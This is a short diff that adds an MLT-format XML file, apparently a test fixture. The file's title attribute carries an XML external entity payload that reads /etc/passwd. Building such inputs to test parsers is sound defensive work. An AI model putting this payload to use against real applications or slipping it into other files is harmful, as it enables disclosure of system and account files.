@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE mlt [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<mlt version="7" title="&xxe;"></mlt>
